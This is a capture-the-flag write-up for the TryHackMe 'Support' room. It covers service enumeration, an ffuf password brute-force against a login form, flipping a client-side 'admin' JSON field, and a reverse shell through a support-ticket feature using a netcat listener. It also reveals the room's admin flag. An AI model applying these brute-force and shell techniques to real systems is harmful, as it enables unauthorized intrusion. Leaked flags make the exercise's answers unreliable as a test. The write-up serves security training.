# TryHackMe - Support Write-up

> **Platform:** TryHackMe
> **Room:** Support

---

# Room Objective

The goal of this room is to enumerate the target, gain administrator access to the web application, exploit the vulnerable support ticket system to obtain a reverse shell, and retrieve the final user flag.

---

# Questions

## Question 1

> **What is the flag value after logging in as admin?**

Answer format:

```text
***{*_**_********}
```

---

## Question 2

> **What is the content of the file `/home/ubuntu/user.txt`?**

Answer format:

```text
***{***_***_*******}
```

---

# Reconnaissance

## Nmap Scan

The first step was to identify the running services.

```bash
nmap -sC -sV <TARGET_IP>
```

### Results

```
22/tcp open ssh
80/tcp open http
```

The target exposes an SSH service and a web server. Since SSH credentials are unknown, the web application became the primary attack surface.

---

# Web Enumeration

To discover hidden directories, I used **Gobuster**.

```bash
gobuster dir \
-u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

After enumerating the application, I manually inspected the website using:

* Browser Developer Tools
* Inspect Element
* View Page Source
* Network tab

While monitoring the HTTP requests, I found the login request containing the following parameters:

```
email
password
```

---

# Password Discovery

The room provides the following MD5 hash as a hint:

```
e9646d086a37906e5bec4323d3b37c9b
```

Instead of cracking the hash manually, I used **FFUF** together with the **RockYou** wordlist to brute-force the password.

```bash
ffuf \
-w /usr/share/wordlists/rockyou.txt \
-X POST \
-d "email=help@support.thm&password=FUZZ" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://<TARGET_IP>/ \
-fs 2678
```

### Parameters

* `FUZZ` replaces the password with every word from the wordlist.
* `-fs 2678` filters responses that match the size of an unsuccessful login.

After several requests, FFUF returned the correct password.

> **Note:** The string `support@110` appears in the application but is **not** the correct password. It should not be used directly.

---

# Administrator Access

After logging in as the support user, I continued analyzing the application's requests.

One of the responses returned the following JSON object:

```json
{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```

The room hint suggests modifying the application's state.

Changing

```json
"admin": false
```

to

```json
"admin": true
```

grants administrator privileges.

You can also experiment with the following value:

```json
"2FA": false
```

although changing the `admin` field is the important step.

After modifying the request, I successfully gained administrator access.

---

# Admin Flag

Once logged in as the administrator, the first flag is displayed.

```
THM{I_AM_ADMIN999}
```

---

# Remote Code Execution

The administrator panel contains a vulnerable **Support Ticket** feature.

This functionality can be abused to execute arbitrary commands and obtain a reverse shell.

First, start a local HTTP server to host the payload.

```bash
python3 -m http.server 8000
```

Next, start a Netcat listener.

```bash
nc -lvnp 4444
```

Generate a reverse shell payload (for example, using RevShells) and execute it through the vulnerable ticket functionality.

After triggering the payload, a reverse shell is established.

---

# User Flag

With shell access to the target machine, retrieve the final flag.

```bash
cat /home/ubuntu/user.txt
```

Copy the contents of the file to complete the room.

---

# Tools Used

* Nmap
* Gobuster
* FFUF
* Browser Developer Tools
* Burp Suite
* Netcat
* Python HTTP Server

---

# Attack Path

1. Enumerated the target using **Nmap**.
2. Enumerated web directories using **Gobuster**.
3. Inspected HTTP requests with the browser Developer Tools.
4. Brute-forced the support account password using **FFUF**.
5. Modified the `admin` property from `false` to `true`.
6. Logged in as the administrator and obtained the first flag.
7. Exploited the vulnerable support ticket functionality to achieve Remote Code Execution.
8. Established a reverse shell.
9. Retrieved the final flag from `/home/ubuntu/user.txt`.

---

# Flags

## Administrator Flag

```text
THM{I_AM_ADMIN999}
```

## User Flag

```text
THM{***_***_*******}
```

---

# Conclusion

This room demonstrates a realistic web application attack chain involving enumeration, password discovery, client-side privilege escalation, and remote code execution. It highlights the importance of validating authorization on the server side rather than trusting client-controlled values such as `admin` or `2FA`.
